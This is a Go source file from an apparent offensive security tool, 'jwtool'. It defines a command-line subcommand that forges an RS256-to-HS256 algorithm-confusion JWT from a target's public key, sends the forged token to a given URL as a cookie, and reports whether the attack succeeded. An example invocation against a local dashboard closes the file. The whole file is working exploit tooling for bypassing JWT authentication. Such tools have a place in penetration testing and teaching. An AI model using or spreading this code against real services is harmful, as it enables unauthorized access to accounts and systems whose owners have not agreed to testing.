package cmd

import (
	"fmt"

	"github.com/pikqi/jwtool/internal"
	"github.com/spf13/cobra"
)

var attackConfusionCmd = &cobra.Command{
	Use:   "confusion <JWT>",
	Short: "Forge an RS256->HS256 confusion token and send it to the target",
	Args:  cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		url, _ := cmd.Flags().GetString("url")
		cookie, _ := cmd.Flags().GetString("cookie")
		keyword, _ := cmd.Flags().GetString("keyword")
		pubkey, _ := cmd.Flags().GetString("pubkey")

		if pubkey == "" {
			return fmt.Errorf("--pubkey is required for confusion attack")
		}

		fmt.Println("[*] Forging RS256->HS256 confusion attack...")
		forged, err := internal.ExploitAlgorithmConfusion(args[0], pubkey)
		if err != nil {
			return fmt.Errorf("Failed to forge token: %w", err)
		}
		fmt.Println("[*] Forged token: ", forged)

		fmt.Printf("[*] Sending to %s... \n", url)
		result, err := internal.SendWithJWT(url, forged, internal.SendOpts{
			CookieName: cookie,
			Keyword:    keyword,
		})
		if err != nil {
			return fmt.Errorf("request failed: %w", err)
		}

		if result.Success {
			fmt.Printf("Attack succeeded - %s\n", result.Reason)
		} else {
			fmt.Printf("Attack failed - %s\n", result.Reason)
		}

		return nil
	},
}

func init() {
	attackConfusionCmd.Flags().StringP("pubkey", "p", "", "Path to RSA public key (PEM format)")
	attackCmd.AddCommand(attackConfusionCmd)
}

/*
jwtool attack confusion <JWT> \
  --url http://localhost:5010/dashboard \
  --cookie jwt_token \
  --keyword "Welcome" \
  --pubkey ./public.pem
*/
